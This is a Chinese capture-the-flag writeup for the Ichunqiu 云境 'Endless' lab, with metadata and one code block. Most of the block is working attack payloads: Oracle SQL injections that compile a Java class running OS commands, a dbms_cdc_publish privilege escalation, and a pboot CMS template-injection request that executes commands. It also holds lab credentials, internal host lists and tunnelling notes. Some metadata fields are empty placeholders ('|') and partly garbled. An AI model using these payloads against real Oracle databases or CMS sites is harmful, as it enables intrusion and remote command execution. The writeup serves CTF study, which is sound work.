---
title: Ichunqiu 云境 —— Endless (无间计划) Writeup
contest: Ichunqiu 云境
year: 2022
difficulty: hard
vuln_type: web_unknown
tags:
- Oracle
- Java Source 注入
- dbms_xmlquery
- 域渗透
- 提权
- dbms_cdc_publish
attack_chain: '|'
key_payload: '|'
one_liner: Oracle 注入 + Java Source 创建 + dbms_cdc_publish 提权 + pboot CMS 后台命令执行 + 大型内网域渗透拓扑。
lesson: '|'
quality: high
full_path: Ichunqiu云境_——_Endless(无间计划)_Writeup.full.md
meta_path: Ichunqiu云境_——_Endless(无间计划)_Writeup.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: Ichunqiu 云境 —— Endless (无间计划) Writeup。Oracle 注入 + Java Source 创建 + dbms_cdc_publish 提权 + pboot CMS 后台命令执行 + 大型内网域渗透拓扑。。经验：|
category: web
subcategory: web_other
tools_used:
- Java
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/105171.html
reasoning_chain:
- Web 入口 admin 路径 → 触发点：Oracle SQL 注入
- 假设：注入点接受 union select → 动作：admin' union select null,null,null-- → 观察：返回 3 列
- 动作：admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {...}'';commit;end;') from dual)>1-- → 触发点：Java Source 注入
- 假设：LinxUtil.runCMD 可被 SQL 函数调用 → 动作：admin' union select null,(select LINXRUNCMD('whoami') from dual),null from dual--
- 观察：whoami 返回 nt authority\system → 完成 Oracle 提权
- 动作：admin' AND (SELECT dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' begin sys.dbms_cdc_publish.create_change_set...''); commit; end;') from dual)>1-- → 触发点：dbms_cdc_publish 提权
- 观察：CDC publisher 默认 system 权限 → 下一步：横向到内网
- 动作：从 DC 跳到 pboot CMS 后台 admin.php → 假设：模板注入
- 动作：构造模板 payload → 完成 cms 命令执行
- 假设：进入内网 → 动作：frp + proxychains 搭隧道 → 假设：域渗透拓扑复杂
failed_attempts:
- 试图直接 utl_http.request → 失败：权限受限
- 试图用 DBMS_XSLPROCESSOR → 失败：12c 后默认无权限
- pboot CMS 试图上传 webshell → 失败：必须走模板标签
key_observations:
- Oracle Java Source 注入是 CTF Oracle 题经典提权链（创建 class → 调用 static 方法）
- dbms_cdc_publish 是 12c+ 默认 system 权限的执行点
- pboot CMS 模板标签 `{pboot:if}` 接受 PHP 表达式 → RCE
- Oracle → Windows 内网跨平台提权要善用 PRAGMA AUTONOMOUS_TRANSACTION
- 复杂内网拓扑必须 frp 多级代理 + proxychains
prerequisites:
- Oracle SQL 注入 + Java Source 注入（dbms_xmlquery.newcontext）
- Oracle 提权包（dbms_cdc_publish / utl_file）
- pboot CMS 模板语法
- 域渗透 + frp 多级代理
---
# Ichunqiu云境 —— Endless(无间计划) Writeup

> 原文: https://www.ctfiot.com/105171.html
> ID: 105171


```
1. 创建JAVA Source
admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"n";myReader.close();
return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual)>1 --

2.提权
admin' AND (SELECT dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate '' begin sys.dbms_cdc_publish.create_change_set('''' a'''',''''a'''',''''a''''''''||TEST.pwn()||''''''''a'''',''''Y'''',s ysdate,sysdate);end;''; commit; end;') from dual)>1--

3.创建函数
admin' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LINXRUNCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual)>1--

4.查询创建的函数
admin' union select null,(select object_name from all_objects where object_name ='LINXRUNCMD' and rownum=1),null from dual--

5.查询java source
admin' union select null,(select object_name from all_objects where object_name ='LinxUtil'),null from dual--

6.命令执行
admin' union select null,(select LINXRUNCMD('whoami') from dual),null from dual--
GET /?a=}{pboot{user:
password}:if(("sysx74em")("whoami"));//)}xxx{/pboot{user:
password}:if} HTTP/1.1
Host: 39.98.94.70:80
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://39.98.94.70/admin.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: lg=cn; PbootSystem=h6o5ta1btl6o32bi184ula183l
Connection: close
Content-Length: 0
username: usera@pentest.com
password：Admin3gv83
172.24.7.5 DCadmin.pen.me (当前不在我们的范围内)
172.24.7.48 IZAYSXE6VCUHB4Z.pentest.me (在范围内，未拿下)
172.24.7.16 IZMN9U6ZO3VTRNZ.pentest.me (在范围内，已经拿下)
172.24.7.3 DC.pentest.me (在范围内，未拿下)
172.24.7.43 IZMN9U6ZO3VTRPZ.pentest.me (在范围内，未拿下)
172.24.7.16:80（双网卡，通172.23.4.0/24） ---forward--- 172.23.4.19:81(SSH) ---forward--- localhost:79 ---forward--- kali:
8001
pen.me
    172.25.12.7 (172.24.7.5) DCadmin.pen.me (在范围内，还没拿下)
    172.25.12.19 IZ1TUCEKFDPCEMZ.pen.me (在范围内，还没拿下)
    172.25.12.29 IZ88QYK8Y8Y3VXZ.pen.me (在范围内，还没拿下)

pentest.me
    172.25.12.9 (172.24.7.3) DC.pentest.me (在范围内，已经拿下)
    172.24.7.48 IZAYSXE6VCUHB4Z.pentest.me (在范围内，已经拿下)
    172.24.7.16 IZMN9U6ZO3VTRNZ.pentest.me (在范围内，已经拿下)
    172.24.7.3 DC.pentest.me (在范围内，已经拿下)
    172.24.7.43 IZMN9U6ZO3VTRPZ.pentest.me (在范围内，有管理员凭据，还没登录上去)
confluence: 172.24.7.27:
8090
gitlab: 172.24.7.23
IP: 172.26.8.16
username: sa
password: sqlserver_2022
IP: 172.26.8.16
username: sa
password: sqlserver_2022
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]